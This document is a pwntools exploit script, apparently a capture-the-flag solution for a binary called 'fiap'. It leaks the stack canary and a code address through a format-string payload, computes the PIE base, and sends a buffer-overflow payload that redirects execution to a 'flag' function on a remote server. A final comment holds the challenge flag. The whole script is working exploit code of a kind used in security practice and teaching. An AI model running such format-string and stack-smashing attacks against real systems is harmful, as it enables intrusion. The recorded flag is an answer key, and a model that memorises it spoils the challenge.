#!/usr/bin/env python3
from pwn import *

context.terminal = ['urxvt', '-e', 'sh', '-c']
context.log_level = 'debug'
debug = 0

if debug:
    io = gdb.debug(['./fiap'], gdbscript='''
b gets
b *(say_hi+202)
b *(say_hi+0xe5)
c
''')
else:
    #io = process(['./fiap'])
    io = remote('88.198.219.20', 49417)
binary = ELF('./fiap')
flag = binary.symbols['flag']
say_hi = binary.symbols['say_hi']

# 11 - canary, 3 -- say_hi + 13 
payload = b'%11$x %3$x '
io.recvuntil("What's your name?")
io.sendline(payload)
addrs = io.recvuntil("Thank you, ")
addrs = io.recvline().decode("utf-8")
addrs = addrs.split()
canary = int(addrs[0], 16)
pie = int(addrs[1], 16) - say_hi - 13

io.recvuntil("Would you like some cake?")
payload = 25*b'A' + p32(canary) + 12*b'A' + p32(pie + flag)
io.sendline(payload)

io.interactive()
#ractf{B4k1ng_4_p1E!}
